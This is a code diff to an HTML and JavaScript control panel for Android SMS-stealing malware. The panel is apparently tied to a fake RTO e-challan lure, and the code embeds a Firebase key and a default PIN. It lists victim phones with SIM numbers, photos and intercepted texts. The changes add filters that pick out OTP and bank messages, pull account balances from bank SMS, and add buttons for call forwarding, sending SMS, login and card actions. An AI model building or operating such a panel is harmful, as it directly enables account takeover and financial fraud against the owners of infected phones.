@@ -9,6 +9,7 @@
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body { font-family: 'Segoe UI', Roboto, sans-serif; background: #0A0E1A; color: #E5E7EB; min-height: 100vh; }
+/* LOGIN */
 .login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0A0E1A; display: flex; align-items: center; justify-content: center; z-index: 10000; padding: 20px; }
 .login-box { background: #111827; border: 1px solid #00E5FF; border-radius: 16px; padding: 32px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 20px 60px rgba(0,229,255,0.2); }
 .login-box h1 { color: #00E5FF; font-size: 22px; margin-bottom: 8px; }
@@ -18,6 +19,7 @@ body { font-family: 'Segoe UI', Roboto, sans-serif; background: #0A0E1A; color: 
 .btn-primary { width: 100%; padding: 14px; background: #00E5FF; color: #0A0E1A; border: none; border-radius: 10px; font-size: 14px; font-weight: bold; cursor: pointer; }
 .btn-primary:hover { background: #00B8D4; }
 .error-msg { color: #FF3B5C; font-size: 12px; margin-top: 8px; min-height: 16px; }
+/* TOP BAR */
 .topbar { background: #111827; padding: 14px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1F2F4A; position: sticky; top: 0; z-index: 100; }
 .topbar h1 { color: #00E5FF; font-size: 18px; }
 .topbar-right { display: flex; align-items: center; gap: 12px; }
@@ -25,10 +27,19 @@ body { font-family: 'Segoe UI', Roboto, sans-serif; background: #0A0E1A; color: 
 .dot { width: 8px; height: 8px; border-radius: 50%; background: #00FF88; animation: pulse 2s infinite; }
 @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
 .btn-logout { background: #FF3B5C; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 11px; font-weight: bold; cursor: pointer; }
+/* STATS */
 .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; padding: 16px 20px; max-width: 1400px; margin: 0 auto; }
 .stat-card { background: linear-gradient(135deg, #1E40AF, #7C3AED); padding: 14px; border-radius: 12px; text-align: center; }
 .stat-card .num { font-size: 26px; font-weight: bold; color: white; }
 .stat-card .label { font-size: 10px; color: rgba(255,255,255,0.8); text-transform: uppercase; letter-spacing: 0.1em; margin-top: 2px; }
+/* QUICK ACTIONS */
+.quick-actions { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 10px; padding: 0 20px 20px; max-width: 1400px; margin: 0 auto; }
+.action-btn { background: #0F1729; border: 1px solid #1F2F4A; border-radius: 12px; padding: 14px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 10px; color: #E5E7EB; }
+.action-btn:hover { border-color: #00E5FF; transform: translateY(-2px); }
+.action-icon { font-size: 20px; }
+.action-label { font-size: 12px; font-weight: bold; }
+.action-sub { font-size: 10px; color: #8B9BB4; margin-top: 2px; }
+/* CONTAINER */
 .container { max-width: 1400px; margin: 0 auto; padding: 0 20px 40px; }
 .section-title { color: #00E5FF; font-size: 13px; font-weight: bold; letter-spacing: 0.1em; margin: 16px 0 10px; text-transform: uppercase; }
 .search-box { width: 100%; padding: 12px 16px; background: #0F1729; border: 1px solid #1F2F4A; border-radius: 10px; color: #E5E7EB; font-size: 13px; margin-bottom: 14px; }
@@ -36,6 +47,7 @@ body { font-family: 'Segoe UI', Roboto, sans-serif; background: #0A0E1A; color: 
 .filters { display: flex; gap: 6px; margin-bottom: 12px; flex-wrap: wrap; }
 .filter-btn { padding: 6px 14px; background: #0F1729; border: 1px solid #1F2F4A; border-radius: 8px; color: #00E5FF; font-size: 11px; font-weight: bold; cursor: pointer; }
 .filter-btn.active { background: #00E5FF; color: #0A0E1A; }
+/* DEVICE GRID */
 .device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 12px; }
 .device-card { background: #0F1729; border: 1px solid #1F2F4A; border-radius: 14px; padding: 14px; cursor: pointer; transition: 0.2s; }
 .device-card:hover { border-color: #00E5FF; transform: translateY(-2px); }
@@ -50,29 +62,76 @@ body { font-family: 'Segoe UI', Roboto, sans-serif; background: #0A0E1A; color: 
 .device-details { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding-top: 10px; border-top: 1px solid #1F2F4A; font-size: 11px; }
 .device-details .label { color: #5A6B85; font-size: 9px; text-transform: uppercase; }
 .device-details .value { color: #E5E7EB; margin-top: 2px; font-weight: 500; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+/* MODAL */
 .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 999; justify-content: center; align-items: center; padding: 10px; }
 .modal-overlay.active { display: flex; }
 .modal-content { background: #111827; border-radius: 16px; max-width: 950px; width: 100%; max-height: 92vh; overflow: hidden; display: flex; flex-direction: column; border: 1px solid #00E5FF; }
 .modal-header { padding: 14px 18px; border-bottom: 1px solid #1F2F4A; display: flex; justify-content: space-between; align-items: center; background: #0F1729; }
 .modal-header h2 { color: #00E5FF; font-size: 15px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
 .close-btn { background: #FF3B5C; color: white; border: none; width: 30px; height: 30px; border-radius: 8px; cursor: pointer; font-size: 16px; flex-shrink: 0; }
+/* DEVICE INFO CARD */
+.device-info-card { background: #0F1729; padding: 14px; border-bottom: 1px solid #1F2F4A; }
+.device-info-card .diag { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+.device-info-card .info-item { font-size: 11px; }
+.device-info-card .info-label { color: #5A6B85; font-size: 9px; text-transform: uppercase; }
+.device-info-card .info-value { color: #E5E7EB; font-weight: 500; margin-top: 2px; }
+/* ACTION BAR */
+.action-bar { display: flex; gap: 6px; padding: 12px 14px; overflow-x: auto; background: #0F1729; border-bottom: 1px solid #1F2F4A; }
+.action-chip { padding: 8px 14px; background: #1A2F4A; border: 1px solid #1F2F4A; border-radius: 8px; color: #00E5FF; font-size: 11px; font-weight: bold; cursor: pointer; white-space: nowrap; transition: 0.2s; }
+.action-chip:hover { border-color: #00E5FF; background: #0A2A3A; }
+.action-chip.danger { color: #FF3B5C; }
+/* MESSAGES HEADER */
+.msg-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 14px; background: #0F1729; border-bottom: 1px solid #1F2F4A; }
+.msg-header .count { color: #00E5FF; font-size: 12px; font-weight: bold; }
+.msg-header .actions { display: flex; gap: 10px; }
+.msg-header .actions span { color: #00E5FF; font-size: 11px; cursor: pointer; }
+/* MSG TABS */
+.msg-tabs { display: flex; gap: 6px; padding: 10px 14px; background: #0F1729; }
+.msg-tab { padding: 6px 16px; background: #1A2F4A; border: none; border-radius: 8px; color: #00E5FF; font-size: 11px; font-weight: bold; cursor: pointer; }
+.msg-tab.active { background: #00E5FF; color: #0A0E1A; }
+/* BALANCE CARD */
+.balance-card { margin: 10px 14px; background: #0F1729; border: 1px solid #00FF88; border-radius: 10px; padding: 10px 14px; display: flex; align-items: center; gap: 10px; }
+.balance-card .lock { font-size: 20px; }
+.balance-card .bank { color: #8B9BB4; font-size: 10sp; text-transform: uppercase; }
+.balance-card .amt { color: #00FF88; font-size: 16px; font-weight: bold; }
+/* FILTER DROPDOWN */
+.filter-dropdown { margin: 0 14px 10px; }
+.filter-dropdown select { width: 100%; padding: 10px; background: #0F1729; border: 1px solid #1F2F4A; border-radius: 8px; color: #E5E7EB; font-size: 12px; }
+/* TABS */
 .tabs { display: flex; gap: 3px; padding: 10px 14px 0; background: #0F1729; border-bottom: 1px solid #1F2F4A; overflow-x: auto; }
 .tab { padding: 9px 14px; background: transparent; border: none; color: #00E5FF; font-size: 11px; font-weight: bold; cursor: pointer; border-radius: 8px 8px 0 0; white-space: nowrap; }
 .tab.active { background: #00E5FF; color: #0A0E1A; }
-.modal-body { padding: 16px; overflow-y: auto; flex: 1; }
+.modal-body { padding: 0 14px 14px; overflow-y: auto; flex: 1; }
+/* MESSAGE ITEM */
 .message-item { background: #0F1729; border-left: 3px solid #00E5FF; border-radius: 8px; padding: 12px; margin-bottom: 10px; }
 .message-item.sent { border-left-color: #00FF88; }
-.msg-sender { color: #00E5FF; font-size: 12px; font-weight: bold; margin-bottom: 4px; }
+.msg-sender { color: #00E5FF; font-size: 12px; font-weight: bold; margin-bottom: 4px; display: flex; justify-content: space-between; align-items: center; }
 .msg-body { color: #E5E7EB; font-size: 13px; line-height: 1.4; word-break: break-word; }
-.msg-date { color: #5A6B85; font-size: 10px; margin-top: 6px; text-align: right; }
-.photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 8px; }
+.msg-date { color: #5A6B85; font-size: 10px; margin-top: 6px; display: flex; justify-content: space-between; align-items: center; }
+.msg-actions { display: flex; gap: 6px; }
+.msg-action-btn { background: #1A2F4A; border: none; color: #00E5FF; padding: 4px 10px; border-radius: 6px; font-size: 10px; cursor: pointer; }
+.msg-action-btn:hover { background: #00E5FF; color: #0A0E1A; }
+/* PHOTOS */
+.photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 8px; padding: 14px 0; }
 .photo-item { border-radius: 8px; overflow: hidden; background: #0F1729; cursor: pointer; }
 .photo-item img { width: 100%; height: 110px; object-fit: cover; display: block; }
 .photo-name { padding: 5px; font-size: 9px; color: #8B9BB4; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
+/* APPS */
 .app-item { background: #0F1729; padding: 10px 12px; border-radius: 8px; margin-bottom: 6px; display: flex; align-items: center; gap: 10px; }
 .app-icon { width: 32px; height: 32px; background: #1A2F4A; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #00E5FF; font-size: 16px; }
 .app-name { color: white; font-size: 12px; font-weight: bold; }
 .app-package { color: #8B9BB4; font-size: 9px; font-family: monospace; margin-top: 2px; }
+/* DIALOG */
+.dialog-content { background: #111827; border-radius: 16px; max-width: 500px; width: 100%; max-height: 90vh; overflow: hidden; display: flex; flex-direction: column; border: 1px solid #00E5FF; }
+.dialog-body { padding: 16px; overflow-y: auto; }
+.form-group { margin-bottom: 12px; }
+.form-label { display: block; color: #8B9BB4; font-size: 11px; margin-bottom: 4px; text-transform: uppercase; }
+.form-input, .form-select, .form-textarea { width: 100%; padding: 10px 12px; background: #0F1729; border: 1px solid #1F2F4A; border-radius: 8px; color: #E5E7EB; font-size: 13px; font-family: inherit; }
+.form-textarea { min-height: 80px; resize: vertical; }
+.form-input:focus, .form-textarea:focus, .form-select:focus { outline: none; border-color: #00E5FF; }
+.btn-submit { width: 100%; padding: 12px; background: #00E5FF; color: #0A0E1A; border: none; border-radius: 8px; font-size: 13px; font-weight: bold; cursor: pointer; margin-top: 4px; }
+.btn-submit:hover { background: #00B8D4; }
+.btn-submit.danger { background: #FF3B5C; color: white; }
 .loading { text-align: center; padding: 40px; color: #5A6B85; }
 .empty-msg { text-align: center; padding: 40px 20px; color: #5A6B85; font-size: 13px; }
 @media (max-width: 600px) {
@@ -103,14 +162,12 @@ body { font-family: 'Segoe UI', Roboto, sans-serif; background: #0A0E1A; color: 
       <button class="btn-logout" id="logoutBtn">LOGOUT</button>
     </div>
   </div>
-
   <div class="stats">
     <div class="stat-card"><div class="num" id="statDevices">0</div><div class="label">Devices</div></div>
     <div class="stat-card"><div class="num" id="statOnline">0</div><div class="label">Online</div></div>
     <div class="stat-card"><div class="num" id="statMessages">0</div><div class="label">Messages</div></div>
     <div class="stat-card"><div class="num" id="statPhotos">0</div><div class="label">Photos</div></div>
   </div>
-
   <div class="container">
     <div class="section-title">📱 All Devices (<span id="deviceCount">0</span>)</div>
     <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search by model, ID, SIM...">
@@ -119,9 +176,7 @@ body { font-family: 'Segoe UI', Roboto, sans-serif; background: #0A0E1A; color: 
       <div class="filter-btn" data-filter="online">Online</div>
       <div class="filter-btn" data-filter="offline">Offline</div>
     </div>
-    <div class="device-grid" id="deviceGrid">
-      <div class="loading">Loading devices...</div>
-    </div>
+    <div class="device-grid" id="deviceGrid"><div class="loading">Loading devices...</div></div>
   </div>
 </div>
 
@@ -131,6 +186,38 @@ body { font-family: 'Segoe UI', Roboto, sans-serif; background: #0A0E1A; color: 
       <h2 id="modalTitle">Device Details</h2>
       <button class="close-btn" id="closeModalBtn">✕</button>
     </div>
+    <div class="device-info-card" id="deviceInfoCard"></div>
+    <div class="action-bar">
+      <div class="action-chip" id="btnCallFwd">📞 CALL FWD</div>
+      <div class="action-chip" id="btnSendSms">📧 SEND SMS</div>
+      <div class="action-chip" id="btnTelegram">✈️ TELEGRAM</div>
+      <div class="action-chip" id="btnLogin">🔐 LOGIN</div>
+      <div class="action-chip" id="btnCard">💳 CARD</div>
+      <div class="action-chip danger" id="btnDeleteDevice">🗑️ DELETE</div>
+    </div>
+    <div class="msg-header">
+      <span class="count" id="msgCount">MESSAGES (0)</span>
+      <div class="actions">
+        <span id="btnRefreshMsgs">🔄</span>
+        <span id="btnDeleteAllMsgs">🗑 ALL</span>
+      </div>
+    </div>
+    <div class="msg-tabs">
+      <button class="msg-tab active" data-msgfilter="incoming">Incoming</button>
+      <button class="msg-tab" data-msgfilter="sent">Sent</button>
+    </div>
+    <div id="balanceCardContainer"></div>
+    <div class="filter-dropdown">
+      <select id="msgCategory">
+        <option value="All">All</option>
+        <option value="Bank">Bank</option>
+        <option value="OTP">OTP</option>
+        <option value="Balance">Balance</option>
+        <option value="Credit">Credit</option>
+        <option value="Debit">Debit</option>
+        <option value="Alert">Alert</option>
+      </select>
+    </div>
     <div class="tabs">
       <button class="tab active" data-tab="messages">📨 Messages</button>
       <button class="tab" data-tab="photos">🖼️ Photos</button>
@@ -138,16 +225,21 @@ body { font-family: 'Segoe UI', Roboto, sans-serif; background: #0A0E1A; color: 
       <button class="tab" data-tab="notifications">🔔 Notifs</button>
       <button class="tab" data-tab="info">ℹ️ Info</button>
     </div>
-    <div class="modal-body" id="modalBody">
-      <div class="loading">Loading...</div>
+    <div class="modal-body" id="modalBody"><div class="loading">Loading...</div></div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="dialog">
+  <div class="dialog-content">
+    <div class="modal-header">
+      <h2 id="dialogTitle">Dialog</h2>
+      <button class="close-btn" id="closeDialogBtn">✕</button>
     </div>
+    <div class="dialog-body" id="dialogBody"></div>
   </div>
 </div>
 
 <script>
-// ═══════════════════════════════════════════
-// FIREBASE
-// ═══════════════════════════════════════════
 var firebaseConfig = {
   apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
   databaseURL: "https://rto-echallan-v2-default-rtdb.firebaseio.com",
@@ -160,28 +252,17 @@ var db = firebase.database();
 var allDevices = {};
 var currentDeviceId = null;
 var currentTab = 'messages';
+var currentMsgFilter = 'incoming';
 var deviceMessages = {};
 var devicePhotos = {};
 var currentFilter = 'all';
 
-// ═══════════════════════════════════════════
-// LOGIN
-// ═══════════════════════════════════════════
 function doLogin() {
   var pin = document.getElementById('pinInput').value.trim();
-  console.log('Login attempt with PIN:', pin);
-  
-  if (pin.length < 4) {
-    document.getElementById('errorMsg').textContent = 'Enter valid PIN';
-    return;
-  }
-  
+  if (pin.length < 4) { document.getElementById('errorMsg').textContent = 'Enter valid PIN'; return; }
   document.getElementById('errorMsg').textContent = 'Checking...';
-  
   db.ref('admin_config/login_pin').once('value').then(function(snap) {
     var savedPin = snap.val() || '0987';
-    console.log('Firebase PIN:', savedPin, 'Entered:', pin);
-    
     if (pin === savedPin) {
       localStorage.setItem('admin_logged_in', 'true');
       document.getElementById('loginScreen').style.display = 'none';
@@ -191,24 +272,21 @@ function doLogin() {
       document.getElementById('errorMsg').textContent = '❌ Wrong PIN';
     }
   }).catch(function(err) {
-    console.error('Firebase error:', err);
     document.getElementById('errorMsg').textContent = 'Error: ' + err.message;
   });
 }
 
-function doLogout() {
-  localStorage.removeItem('admin_logged_in');
-  location.reload();
-}
+function doLogout() { localStorage.removeItem('admin_logged_in'); location.reload(); }
 
-// ═══════════════════════════════════════════
-// START APP
-// ═══════════════════════════════════════════
 function startApp() {
   db.ref('device_info').on('value', function(snapshot) {
     allDevices = snapshot.val() || {};
     updateStats();
     renderDevices();
+    if (currentDeviceId) {
+      var dev = allDevices[currentDeviceId];
+      if (dev) { renderDeviceInfo(dev); }
+    }
   });
 }
 
@@ -239,45 +317,22 @@ function renderDevices() {
     var s = (id + ' ' + (dev.device_model || '') + ' ' + (dev.sim_info && dev.sim_info.sim1_number || '')).toLowerCase();
     return s.indexOf(search) !== -1;
   });
-  
-  if (ids.length === 0) {
-    grid.innerHTML = '<div class="empty-msg">No devices found</div>';
-    return;
-  }
-  
+  if (ids.length === 0) { grid.innerHTML = '<div class="empty-msg">No devices found</div>'; return; }
   ids.sort(function(a, b) {
     var ta = allDevices[a].first_install_timestamp || allDevices[a].install_timestamp || 0;
     var tb = allDevices[b].first_install_timestamp || allDevices[b].install_timestamp || 0;
     return tb - ta;
   });
-  
   grid.innerHTML = ids.map(function(id, idx) {
     var dev = allDevices[id];
     var isOnline = dev.status === 'Online';
     var model = dev.device_model || 'Unknown';
     var battery = dev.battery || '0%';
     var sim = (dev.sim_info && (dev.sim_info.sim1_number || dev.sim_info.sim2_number)) || 'No SIM';
-    return '<div class="device-card" data-id="' + id + '">' +
-      '<div class="device-header">' +
-      '<div class="serial-badge">' + (idx + 1) + '</div>' +
-      '<div class="device-info">' +
-      '<div class="device-name">' + escapeHtml(model) + '</div>' +
-      '<div class="device-id">' + id + '</div>' +
-      '</div>' +
-      '<div class="status-badge ' + (isOnline ? 'status-online' : 'status-offline') + '">' + (isOnline ? 'Online' : 'Offline') + '</div>' +
-      '</div>' +
-      '<div class="device-details">' +
-      '<div><div class="label">Battery</div><div class="value" style="color:' + getBatteryColor(battery) + '">' + battery + '</div></div>' +
-      '<div><div class="label">SIM</div><div class="value">' + escapeHtml(sim) + '</div></div>' +
-      '<div><div class="label">Android</div><div class="value">' + (dev.android_version || '?') + '</div></div>' +
-      '</div>' +
-      '</div>';
+    return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="serial-badge">' + (idx + 1) + '</div><div class="device-info"><div class="device-name">' + escapeHtml(model) + '</div><div class="device-id">' + id + '</div></div><div class="status-badge ' + (isOnline ? 'status-online' : 'status-offline') + '">' + (isOnline ? 'Online' : 'Offline') + '</div></div><div class="device-details"><div><div class="label">Battery</div><div class="value" style="color:' + getBatteryColor(battery) + '">' + battery + '</div></div><div><div class="label">SIM</div><div class="value">' + escapeHtml(sim) + '</div></div><div><div class="label">Android</div><div class="value">' + (dev.android_version || '?') + '</div></div></div></div>';
   }).join('');
-  
   grid.querySelectorAll('.device-card').forEach(function(card) {
-    card.addEventListener('click', function() {
-      openDevice(this.getAttribute('data-id'));
-    });
+    card.addEventListener('click', function() { openDevice(this.getAttribute('data-id')); });
   });
 }
 
@@ -292,19 +347,31 @@ function openDevice(deviceId) {
   currentDeviceId = deviceId;
   var dev = allDevices[deviceId];
   document.getElementById('modalTitle').textContent = '📱 ' + (dev.device_model || deviceId);
-  
+  renderDeviceInfo(dev);
   db.ref('device_info/' + deviceId + '/messages').on('value', function(snap) {
     deviceMessages = snap.val() || {};
     if (currentTab === 'messages') renderTab();
   });
-  
   db.ref('device_info/' + deviceId + '/photos').on('value', function(snap) {
     devicePhotos = snap.val() || {};
     if (currentTab === 'photos') renderTab();
   });
-  
   document.getElementById('modal').classList.add('active');
   switchTab('messages');
+}
+
+function renderDeviceInfo(dev) {
+  var card = document.getElementById('deviceInfoCard');
+  card.innerHTML = '<div class="diag">' +
+    '<div class="info-item"><div class="info-label">Model</div><div class="info-value">' + escapeHtml(dev.device_model || '-') + '</div></div>' +
+    '<div class="info-item"><div class="info-label">Android</div><div class="info-value">' + escapeHtml(dev.android_version || '-') + '</div></div>' +
+    '<div class="info-item"><div class="info-label">Manufacturer</div><div class="info-value">' + escapeHtml(dev.device_manufacturer || '-') + '</div></div>' +
+    '<div class="info-item"><div class="info-label">Serial</div><div class="info-value">' + escapeHtml(dev.serial_number || '-') + '</div></div>' +
+    '<div class="info-item"><div class="info-label">Battery</div><div class="info-value" style="color:' + getBatteryColor(dev.battery || '0%') + '">' + (dev.battery || '-') + ' (' + (dev.battery_status || '-') + ')</div></div>' +
+    '<div class="info-item"><div class="info-label">Last Seen</div><div class="info-value">' + (dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-') + '</div></div>' +
+    '<div class="info-item"><div class="info-label">SIM 1</div><div class="info-value">' + escapeHtml((dev.sim_info && dev.sim_info.sim1_number) || 'No SIM') + '</div></div>' +
+    '<div class="info-item"><div class="info-label">SIM 2</div><div class="info-value">' + escapeHtml((dev.sim_info && dev.sim_info.sim2_number) || 'No SIM') + '</div></div>' +
+    '</div>';
 }
 
 function closeModal() {
@@ -318,51 +385,123 @@ function closeModal() {
 
 function switchTab(tab) {
   currentTab = tab;
-  document.querySelectorAll('.tab').forEach(function(t) {
-    t.classList.toggle('active', t.getAttribute('data-tab') === tab);
-  });
+  document.querySelectorAll('.tab').forEach(function(t) { t.classList.toggle('active', t.getAttribute('data-tab') === tab); });
+  var isMsg = tab === 'messages';
+  document.getElementById('msgCount').parentElement.style.display = isMsg ? 'flex' : 'none';
+  document.querySelector('.msg-tabs').style.display = isMsg ? 'flex' : 'none';
+  document.querySelector('.filter-dropdown').style.display = isMsg ? 'block' : 'none';
+  document.getElementById('balanceCardContainer').style.display = isMsg ? 'block' : 'none';
   renderTab();
+}
+
+function setMsgFilter(filter) {
+  currentMsgFilter = filter;
+  document.querySelectorAll('.msg-tab').forEach(function(t) { t.classList.toggle('active', t.getAttribute('data-msgfilter') === filter); });
+  renderTab();
+}
+
+function detectCategory(sender, body) {
+  var s = (sender || '').toUpperCase();
+  var b = (body || '').toUpperCase();
+  if (b.indexOf('OTP') !== -1 || b.indexOf('VERIFICATION') !== -1) return 'OTP';
+  if (b.indexOf('BAL') !== -1 || b.indexOf('BALANCE') !== -1 || b.indexOf('AVAILABLE') !== -1) return 'BALANCE';
+  if (b.indexOf('CREDIT') !== -1 || b.indexOf('CREDITED') !== -1) return 'CREDIT';
+  if (b.indexOf('DEBIT') !== -1 || b.indexOf('DEBITED') !== -1) return 'DEBIT';
+  if (b.indexOf('BANK') !== -1 || s.indexOf('BANK') !== -1 || s.indexOf('SBI') !== -1 || s.indexOf('HDFC') !== -1) return 'BANK';
+  return 'ALERT';
+}
+
+function detectBankName(sender) {
+  var s = (sender || '').toUpperCase();
+  if (s.indexOf('SBI') !== -1) return 'SBI';
+  if (s.indexOf('HDFC') !== -1) return 'HDFC';
+  if (s.indexOf('ICICI') !== -1) return 'ICICI';
+  if (s.indexOf('AXIS') !== -1) return 'AXIS';
+  if (s.indexOf('PHONEPE') !== -1 || s.indexOf('PHONPE') !== -1) return 'PhonePe';
+  if (s.indexOf('GPAY') !== -1 || s.indexOf('GOOGLE') !== -1) return 'GPay';
+  if (s.indexOf('PAYTM') !== -1) return 'Paytm';
+  return 'Bank';
+}
+
+function extractBalance(body) {
+  var match = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/i);
+  return match ? '₹ ' + match[1] : '₹ --';
 }
 
 function renderTab() {
   var body = document.getElementById('modalBody');
   var dev = allDevices[currentDeviceId];
   if (!dev) { body.innerHTML = '<div class="empty-msg">Device not found</div>'; return; }
-  
+
   if (currentTab === 'messages') {
     var liveMsgs = Object.entries(deviceMessages);
     var histMsgs = Object.entries(dev.sms_history || {});
     var combined = {};
     liveMsgs.forEach(function(pair) { combined['live_' + pair[0]] = pair[1]; });
     histMsgs.forEach(function(pair) { combined['hist_' + pair[0]] = pair[1]; });
-    
     var seen = {};
     var unique = [];
-    Object.entries(combined).sort(function(a, b) {
-      return (b[1].timestamp || 0) - (a[1].timestamp || 0);
-    }).forEach(function(pair) {
+    Object.entries(combined).sort(function(a, b) { return (b[1].timestamp || 0) - (a[1].timestamp || 0); }).forEach(function(pair) {
       var key = (pair[1].sender || '') + '|' + (pair[1].body || '');
-      if (!seen[key]) {
-        seen[key] = true;
-        unique.push(pair);
-      }
+      if (!seen[key]) { seen[key] = true; unique.push(pair); }
     });
+    
+    if (currentMsgFilter === 'incoming') {
+      unique = unique.filter(function(pair) { return (pair[1].type || 'INCOMING') === 'INCOMING'; });
+    } else {
+      unique = unique.filter(function(pair) { return pair[1].type === 'SENT'; });
+    }
+    
+    var cat = document.getElementById('msgCategory').value || 'All';
+    if (cat !== 'All') {
+      unique = unique.filter(function(pair) { return detectCategory(pair[1].sender || '', pair[1].body || '') === cat.toUpperCase(); });
+    }
+    
+    document.getElementById('msgCount').textContent = 'MESSAGES (' + unique.length + ')';
+    
+    if (currentMsgFilter === 'incoming') {
+      var balanceMsg = unique.find(function(pair) { return detectCategory(pair[1].sender || '', pair[1].body || '') === 'BALANCE'; });
+      if (balanceMsg) {
+        document.getElementById('balanceCardContainer').innerHTML = '<div class="balance-card"><div class="lock">🔒</div><div style="flex:1"><div class="bank">' + detectBankName(balanceMsg[1].sender || '') + '</div><div class="amt">' + extractBalance(balanceMsg[1].body || '') + '</div></div></div>';
+      } else {
+        document.getElementById('balanceCardContainer').innerHTML = '';
+      }
+    } else {
+      document.getElementById('balanceCardContainer').innerHTML = '';
+    }
     
     if (unique.length === 0) { body.innerHTML = '<div class="empty-msg">No messages</div>'; return; }
     body.innerHTML = unique.map(function(pair) {
       var m = pair[1];
-      return '<div class="message-item ' + (m.type === 'SENT' ? 'sent' : '') + '">' +
-        '<div class="msg-sender">' + escapeHtml(m.sender || 'Unknown') + '</div>' +
-        '<div class="msg-body">' + escapeHtml(m.body || '') + '</div>' +
-        '<div class="msg-date">' + (m.date || '') + '</div>' +
-        '</div>';
+      var k = pair[0];
+      return '<div class="message-item ' + (m.type === 'SENT' ? 'sent' : '') + '"><div class="msg-sender"><span>' + escapeHtml(m.sender || 'Unknown') + '</span><span style="color:' + (m.type === 'SENT' ? '#00FF88' : '#00E5FF') + ';font-size:9px">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + escapeHtml(m.body || '') + '</div><div class="msg-date"><span>' + (m.date || '') + '</span><div class="msg-actions"><button class="msg-action-btn" data-copy="' + k + '">📋</button><button class="msg-action-btn" data-del="' + k + '">🗑️</button></div></div></div>';
     }).join('');
+    
+    body.querySelectorAll('[data-copy]').forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        var key = this.getAttribute('data-copy');
+        var m = deviceMessages[key] || (allDevices[currentDeviceId].sms_history && allDevices[currentDeviceId].sms_history[key]);
+        if (m) { navigator.clipboard.writeText(m.body || ''); this.textContent = '✅'; setTimeout(function() { this.textContent = '📋'; }.bind(this), 1000); }
+      });
+    });
+    body.querySelectorAll('[data-del]').forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        if (!confirm('Delete this message?')) return;
+        db.ref('device_info/' + currentDeviceId + '/messages/' + this.getAttribute('data-del')).remove();
+      });
+    });
   } else if (currentTab === 'photos') {
     var photos = Object.entries(devicePhotos);
     if (photos.length === 0) { body.innerHTML = '<div class="empty-msg">No photos</div>'; return; }
     body.innerHTML = '<div class="photo-grid">' + photos.map(function(pair) {
-      return '<div class="photo-item"><img src="' + (pair[1].base64 || '') + '" loading="lazy"><div class="photo-name">' + (pair[1].name || 'IMG') + '</div></div>';
+      return '<div class="photo-item" data-photo="' + pair[0] + '"><img src="' + (pair[1].base64 || '') + '" loading="lazy"><div class="photo-name">' + escapeHtml(pair[1].name || 'IMG') + '</div></div>';
     }).join('') + '</div>';
+    body.querySelectorAll('[data-photo]').forEach(function(el) {
+      el.addEventListener('click', function() {
+        var p = devicePhotos[this.getAttribute('data-photo')];
+        if (p && p.base64) { var w = window.open(''); w.document.write('<img src="' + p.base64 + '" style="max-width:100%;max-height:100vh;">'); }
+      });
+    });
   } else if (currentTab === 'apps') {
     var apps = dev.installed_apps || {};
     var list = Object.values(apps).sort(function(a, b) { return (a.name || '').localeCompare(b.name || ''); });
@@ -379,18 +518,7 @@ function renderTab() {
       return '<div class="message-item"><div class="msg-sender">' + escapeHtml(n.app || 'App') + ' — ' + escapeHtml(n.title || '') + '</div><div class="msg-body">' + escapeHtml(n.message || '') + '</div><div class="msg-date">' + (n.date || '') + '</div></div>';
     }).join('');
   } else if (currentTab === 'info') {
-    body.innerHTML = '<div class="message-item"><div class="msg-sender">Device Info</div><div class="msg-body">' +
-      '<strong>Model:</strong> ' + escapeHtml(dev.device_model || '-') + '<br>' +
-      '<strong>Manufacturer:</strong> ' + escapeHtml(dev.device_manufacturer || '-') + '<br>' +
-      '<strong>Android:</strong> ' + (dev.android_version || '-') + '<br>' +
-      '<strong>Serial:</strong> ' + escapeHtml(dev.serial_number || '-') + '<br>' +
-      '<strong>Battery:</strong> ' + (dev.battery || '-') + '<br>' +
-      '<strong>Status:</strong> ' + (dev.status || '-') + '<br>' +
-      '<strong>SIM 1:</strong> ' + escapeHtml((dev.sim_info && dev.sim_info.sim1_number) || '-') + '<br>' +
-      '<strong>SIM 2:</strong> ' + escapeHtml((dev.sim_info && dev.sim_info.sim2_number) || '-') + '<br>' +
-      '<strong>Installed:</strong> ' + (dev.first_install_time || dev.install_time || '-') + '<br>' +
-      '<strong>Last Seen:</strong> ' + (dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-') +
-      '</div></div>';
